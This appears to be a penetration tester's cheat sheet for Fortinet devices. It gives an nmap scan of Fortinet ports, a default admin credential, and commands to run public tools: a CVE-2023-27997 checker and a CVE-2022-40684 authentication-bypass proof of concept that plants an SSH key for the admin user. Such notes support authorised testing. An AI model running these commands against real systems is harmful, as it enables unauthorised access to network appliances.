# Ports

![[fortinet-mindmap.png]]

## Scan

```bash
nmap -sV -sC -iL targets-fortinet.txt -v -p514,541,666,701,1003,8008,8010,8888,8890,9443,10443,13000,13001,13002,13003,13004,13005,13006,13007,13030,13031,13032,13033,13034,13035,13036,13037,13038,13039 -oN fortigate
```

## 443 - Fortinet

>**Default credentials :** admin:

## 541 - Fortinet SSL/VPN

```bash
# INTERACT
openssl s_client -connect $ip:541

# or nc

nc $ip 541
```

## 10443/8443 - Fortigate SSL/VPN
### Check for CVE
- https://github.com/BishopFox/CVE-2023-27997-check

```bash
git clone https://github.com/BishopFox/CVE-2023-27997-check
cd CVE-2023-27997-check
python3 -m venv venv
source venv/bin/activate
python3 -m pip install -r requirements.txt

# usage 
python3 CVE-2023-27997-check.py $ip $port
```

## CVE-2022-40684
- https://github.com/horizon3ai/CVE-2022-40684
>This POC abuses the authentication bypass vulnerability to set an SSH key for the specified user.
>FortiOS version 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, 
>FortiProxy version 7.2.0 and version 7.0.0 through 7.0.6
>FortiSwitchManager version 7.2.0 and 7.0.0

```bash
git clone https://github.com/horizon3ai/CVE-2022-40684.git
cd CVE-2022-40684
python3 CVE-2022-40684.py -t 10.10.10.1 --username admin --key-file ~/.ssh/id_rsa.pub
```